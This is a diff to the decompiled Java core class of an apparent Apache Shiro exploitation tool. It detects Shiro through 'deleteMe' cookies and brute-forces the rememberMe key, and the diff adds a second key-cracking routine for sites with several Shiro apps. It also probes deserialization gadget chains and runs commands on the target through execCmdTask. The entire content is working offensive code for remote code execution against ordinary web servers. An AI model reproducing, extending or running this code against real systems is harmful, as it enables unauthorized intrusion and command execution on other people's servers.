@@ -1,4 +1,7 @@
-
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by Fernflower decompiler)
+//
 
 package com.summersec.attack.core;
 
@@ -26,6 +29,9 @@ import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 import javafx.collections.ObservableList;
 import org.apache.commons.lang.StringUtils;
 import org.apache.shiro.codec.Base64;
@@ -44,6 +50,7 @@ public class AttackService {
     public static String realShiroKey = null;
     public static Map<String, String> globalHeader = null;
     private final MainController mainController;
+    public int flagCount = 0;
 
     public AttackService(String method, String url, String shiroKeyWord, String timeout) {
         this.mainController = (MainController)ControllersFactory.controllers.get(MainController.class.getSimpleName());
@@ -72,6 +79,7 @@ public class AttackService {
         try {
             if (this.method.equals("GET")) {
                 result = HttpUtil.getHeaderByHttpRequest(this.url, "UTF-8", combineHeaders, this.timeout);
+
             } else {
                 result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", "", combineHeaders, this.timeout);
             }
@@ -159,15 +167,15 @@ public class AttackService {
                 header.put("Ctmd", "08fb41620aa4c498a1f2ef09bbc1183c");
                 String result = this.headerHttpRequest(header);
                 if (result.contains("08fb41620aa4c498a1f2ef09bbc1183c")) {
-                    this.mainController.logTextArea.appendText(Utils.log("[*] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
-                    this.mainController.logTextArea.appendText(Utils.log("[*] 请尝试进行功能区利用。"));
+                    this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
+                    this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
                     this.mainController.gadgetOpt.setValue(gadgetOpt);
                     this.mainController.echoOpt.setValue(echoOpt);
                     gadget = gadgetOpt;
                     attackRememberMe = rememberMe;
                     flag = true;
                 } else {
-                    this.mainController.logTextArea.appendText(Utils.log("[x] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
+                    this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
                 }
             }
         } catch (Exception var8) {
@@ -198,7 +206,12 @@ public class AttackService {
         try {
             List<String> tempList = new ArrayList();
             tempList.add(shiroKey);
-            this.keyTestTask(tempList);
+            if (flagCount ==1){
+                this.keyTestTask(tempList);
+            }
+            else{
+                this.keyTestTask2(tempList);}
+
         } catch (Exception var3) {
             this.mainController.logTextArea.appendText(Utils.log(var3.getMessage()));
         }
@@ -208,7 +221,14 @@ public class AttackService {
     public void keysCrack() {
         try {
             List<String> shiroKeys = this.getALLShiroKeys();
-            this.keyTestTask(shiroKeys);
+            if (flagCount ==1){
+                this.keyTestTask(shiroKeys);
+            }
+            else {
+                //多个shiro场景的爆破key方式
+                this.keyTestTask2(shiroKeys);
+                this.mainController.logTextArea.appendText(Utils.log("[++] 含有多个shiro场景"));
+            }
         } catch (Exception var2) {
             this.mainController.logTextArea.appendText(Utils.log(var2.getMessage()));
         }
@@ -220,17 +240,23 @@ public class AttackService {
 
         try {
             HashMap<String, String> header = new HashMap();
-            header.put("Cookie", this.shiroKeyWord + "=1");
+            header.put("Cookie", this.shiroKeyWord + "=yes");
             String result = this.headerHttpRequest(header);
+//            System.out.println(result);
             flag = result.contains("=deleteMe");
+
 //            if (!flag){
 //                flag = result.contains(shiroKeyWord);
 //                flag = true;
 //            }
             if (flag) {
-                this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
+                this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                 flag = true;
+                flagCount = countDeleteMe(result);
+
+
             } else {
+//               再次确认shiro
                 HashMap<String, String> header1 = new HashMap();
                 header1.put("Cookie", this.shiroKeyWord + "=" + AttackService.getRandomString(10));
                 String result1 = this.headerHttpRequest(header1);
@@ -240,12 +266,13 @@ public class AttackService {
 //                    flag = true;
 //                }
                 if(flag){
-                    this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
+                    this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                     flag = true;
+                    flagCount = countDeleteMe(result);
 
                 }else {
 
-                    this.mainController.logTextArea.appendText(Utils.log("未发现shiro框架！"));
+                    this.mainController.logTextArea.appendText(Utils.log("[-] 未发现shiro框架！"));
 
                 }
             }
@@ -268,7 +295,20 @@ public class AttackService {
         }
         return sb.toString();
     }
+    //计算包含几个deleteMe
+    public int countDeleteMe(String text){
+        // 根据指定的字符构建正则
+        Pattern pattern = Pattern.compile("deleteMe");
+        // 构建字符串和正则的匹配
+        Matcher matcher = pattern.matcher(text);
+        int count = 0;
+        // 循环依次往下匹配
+        while (matcher.find()){ // 如果匹配,则数量+1
+            count++;
+        }
+        return  count;
 
+    }
     public void keyTestTask(final List<String> shiroKeys) {
         Thread thread = new Thread(new Runnable() {
             public void run() {
@@ -282,18 +322,20 @@ public class AttackService {
                             header.put("Cookie", rememberMe);
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
-                            if (!result.contains("=deleteMe")) {
-                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[*] " + shirokey));
+                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
+                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
                                 AttackService.this.mainController.shiroKey.setText(shirokey);
                                 AttackService.realShiroKey = shirokey;
                                 break;
                             }
 
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[x] " + shirokey));
+                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
                         } catch (Exception var6) {
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[x]" + shirokey + " " + var6.getMessage()));
+                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
                         }
+
                     }
+                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));
 
                 } catch (Exception var7) {
                     throw var7;
@@ -303,6 +345,41 @@ public class AttackService {
         thread.start();
     }
 
+    public void keyTestTask2(final List<String> shiroKeys) {
+        Thread thread = new Thread(new Runnable() {
+            public void run() {
+                try {
+                    for(int i = 0; i < shiroKeys.size(); ++i) {
+                        String shirokey = (String)shiroKeys.get(i);
+
+                        try {
+                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
+                            HashMap<String, String> header = new HashMap();
+                            header.put("Cookie", rememberMe);
+                            String result = AttackService.this.headerHttpRequest(header);
+                            Thread.sleep(100L);
+                            if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
+                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
+                                AttackService.this.mainController.shiroKey.setText(shirokey);
+                                AttackService.realShiroKey = shirokey;
+                                break;
+                            }
+
+                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
+                        } catch (Exception var6) {
+                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                        }
+
+                    }
+                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));
+
+                } catch (Exception var7) {
+                    throw var7;
+                }
+            }
+        });
+        thread.start();
+    }
     public void execCmdTask(String command) {
         HashMap<String, String> header = new HashMap();
         header.put("Cookie", attackRememberMe);
@@ -315,7 +392,8 @@ public class AttackService {
 
             try {
                 String defaultEncode = Utils.guessEncoding(b64bytes);
-                this.mainController.execOutputArea.appendText(new String(b64bytes, defaultEncode) + "\n");
+                this.mainController.execOutputArea.appendText(new String(b64bytes, defaultEncode));
+                this.mainController.execOutputArea.appendText("-----------------------------------------------------------------------"+ "\n");
             } catch (UnsupportedEncodingException var8) {
                 this.mainController.execOutputArea.appendText(new String(b64bytes) + "\n");
             }
